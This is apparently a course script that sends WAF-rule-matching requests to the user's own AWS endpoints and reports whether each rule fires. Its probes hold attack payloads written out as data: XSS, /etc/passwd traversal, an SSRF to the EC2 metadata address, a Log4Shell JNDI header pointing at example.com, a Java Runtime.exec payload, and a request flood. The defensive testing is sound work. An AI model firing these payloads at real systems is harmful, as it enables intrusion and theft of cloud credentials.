#!/usr/bin/env bash
#
# Attack simulation for the Week 13 WAF build.
#
# Sends benign-but-rule-matching requests to YOUR OWN endpoints to prove each
# rule fires. Nothing here is an exploit: the payloads are the well-known
# signature strings the managed rule groups look for, sent to a Lambda that
# echoes its input and does nothing else. There is no third-party target and
# no vulnerability being exercised.
#
# Both endpoints must be your own, as emitted by `terraform output`:
#   ./attack_simulation.sh <cloudfront_url> <api_invoke_url>
#
# In Count mode every request returns 200 -- that is correct and is the whole
# point of the phase. Rule matches show up in CloudWatch metrics and the WAF
# logs, not in the HTTP status. Re-run after flipping count_mode to false and
# the same requests return 403.

set -uo pipefail

if [[ $# -lt 2 ]]; then
  echo "Usage: $0 <cloudfront_url> <api_invoke_url>" >&2
  echo "  Get both from: terraform output" >&2
  exit 1
fi

EDGE_URL="${1%/}"
ORIGIN_URL="${2%/}"

# Rate-limit flood size. Must exceed the rate_limit Terraform variable
# (default 100) within the evaluation window (default 60s).
FLOOD_COUNT="${FLOOD_COUNT:-150}"

pass=0
fail=0

hr() { printf '%s\n' "------------------------------------------------------------"; }

# Issue one request and report the status code against what we expected.
# expected_enforcing is what the status should be once rules are blocking;
# in Count mode everything legitimately returns 200.
probe() {
  local label="$1" url="$2" expected_enforcing="$3"
  shift 3

  local status
  status=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 15 "$@" "$url" 2>/dev/null)

  if [[ "$status" == "$expected_enforcing" ]]; then
    printf '  %-46s %s  (blocked as expected)\n' "$label" "$status"
    pass=$((pass + 1))
  elif [[ "$status" == "200" ]]; then
    printf '  %-46s %s  (allowed -- expected in Count mode)\n' "$label" "$status"
    pass=$((pass + 1))
  else
    printf '  %-46s %s  (unexpected)\n' "$label" "$status"
    fail=$((fail + 1))
  fi
}

run_suite() {
  local name="$1" base="$2"

  hr
  echo "Target: $name"
  echo "        $base"
  hr

  echo "[0] Baseline -- a normal request, should always be allowed"
  probe "GET / (benign)" "$base/" "200"

  echo
  echo "[1] Core rule set -- cross-site scripting in a query string"
  probe "XSS in query string" \
    "$base/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" "403"

  echo
  echo "[2] Core rule set -- local file inclusion via path traversal"
  probe "Path traversal in URI" \
    "$base/..%2F..%2F..%2Fetc%2Fpasswd" "403"

  echo
  echo "[3] Core rule set -- SSRF against the EC2 instance metadata endpoint"
  probe "IMDS SSRF in query argument" \
    "$base/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F" "403"

  echo
  echo "[4] Core rule set -- request with no User-Agent header"
  probe "Missing User-Agent" "$base/" "403" -H "User-Agent;"

  echo
  echo "[5] Known bad inputs -- Log4Shell (CVE-2021-44228) in a header"
  probe "Log4Shell JNDI in header" "$base/" "403" \
    -H 'X-Api-Version: ${jndi:ldap://example.com/a}'

  echo
  echo "[6] Known bad inputs -- Java deserialization RCE in query string"
  probe "Java deserialization RCE" \
    "$base/?p=%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22whoami%22%29" "403"

  echo
  echo "[7] Known bad inputs -- PROPFIND method"
  probe "PROPFIND method" "$base/" "403" -X PROPFIND

  echo
  echo "[8] Rate-based rule -- ${FLOOD_COUNT} requests as fast as possible"
  echo "    (rate rules evaluate about every 10 seconds, so the first"
  echo "     requests over the limit still get through -- that is normal)"

  local codes
  codes=$(for _ in $(seq 1 "$FLOOD_COUNT"); do
    curl -sS -o /dev/null -w '%{http_code}\n' --max-time 10 "$base/" 2>/dev/null &
  done | sort | uniq -c | sort -rn)
  wait

  echo "$codes" | sed 's/^/      /'
  echo
}

echo
echo "WAF attack simulation -- Week 13"
echo "All payloads are signature strings sent to your own echo endpoint."
echo

run_suite "CloudFront edge (CLOUDFRONT-scope web ACL + Shield Standard)" "$EDGE_URL"
run_suite "API Gateway origin, bypassing the edge (REGIONAL-scope web ACL)" "$ORIGIN_URL"

hr
echo "Probes behaving as expected: $pass"
echo "Unexpected responses:        $fail"
hr
cat <<'EOF'

Where to look next:

  Counted matches per rule (Count mode):
    aws cloudwatch get-metric-statistics --namespace AWS/WAFV2 \
      --metric-name CountedRequests --statistics Sum --period 300 \
      --start-time "$(date -u -d '30 min ago' +%Y-%m-%dT%H:%M:%SZ)" \
      --end-time "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
      --dimensions Name=WebACL,Value=<web-acl-name> Name=Region,Value=<region> Name=Rule,Value=ALL

  Per-request verdicts, including which rule matched:
    MSYS_NO_PATHCONV=1 aws logs tail /aws-waf-logs-<name> --since 15m

  Note: in Git Bash, prefix any aws command whose argument starts with "/"
  with MSYS_NO_PATHCONV=1 -- otherwise the leading slash is rewritten into a
  Windows path and the call fails with a misleading parameter error.
EOF
